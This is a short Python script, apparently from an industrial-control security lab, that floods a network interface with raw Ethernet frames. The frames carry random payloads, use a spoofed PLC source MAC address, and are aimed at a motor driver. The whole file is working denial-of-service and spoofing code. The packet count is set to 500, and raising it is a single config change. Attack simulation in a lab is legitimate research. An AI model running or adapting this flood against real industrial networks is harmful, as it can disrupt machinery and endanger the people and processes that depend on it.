# Second Scenario: High-volume random flooding

import os
import sys
import time
import random
import socket
from scapy.all import Ether, Raw

# ---------- CONFIG ----------
IFACE = "eth0"
SRC_MAC = "30:b8:51:03:21:a2"   # MAC Address PLC
DST_MAC = "00:0d:1e:1c:64:32"   # MAC Address Motor Deiver
PACKETS = 500                   # number of frames to send
PAYLOAD_MIN = 32
PAYLOAD_MAX = 600
VERBOSE_PROGRESS = True
PROGRESS_INTERVAL = 10000         # log every N packets (reduce logging overhead)
# ----------------------------

def random_payload(min_len, max_len, seq):
    l = random.randint(min_len, max_len)
    tag = f"LABTAG:{int(time.time())}:{seq}|"
    tag_bytes = tag.encode(errors='ignore')
    rand_len = max(0, l - len(tag_bytes))
    rand_bytes = os.urandom(rand_len)
    return tag_bytes + rand_bytes

def build_frames_bytes(count):
    frames = []
    for i in range(count):
        payload = random_payload(PAYLOAD_MIN, PAYLOAD_MAX, i)
        pkt = Ether(dst=DST_MAC, src=SRC_MAC) / Raw(load=payload)
        frames.append(bytes(pkt))  # pre-serialize once
    return frames

def main():
    if os.geteuid() != 0:
        print("Run as root (sudo).")
        sys.exit(1)

    print(f"Interface: {IFACE}, Packets: {PACKETS}")
    # prebuild frames as raw bytes
    frames = build_frames_bytes(PACKETS)
    # create AF_PACKET raw socket and bind to interface
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
    s.bind((IFACE, 0))

    sent = 0
    start = time.perf_counter()
    try:
        for i, b in enumerate(frames):
            # single syscall per packet
            s.send(b)
            sent += 1
            if VERBOSE_PROGRESS and (sent % PROGRESS_INTERVAL == 0):
                elapsed = time.perf_counter() - start
                pps = sent / elapsed if elapsed > 0 else 0
                print(f"Sent {sent}/{PACKETS} frames (avg {pps:.0f} pkt/s)")
    except KeyboardInterrupt:
        print("Interrupted by user.")
    finally:
        elapsed = time.perf_counter() - start
        print(f"Finished. Sent={sent} elapsed={elapsed:.3f}s avg_pps={sent/elapsed if elapsed>0 else 0:.0f}")
        s.close()

if __name__ == "__main__":
    main()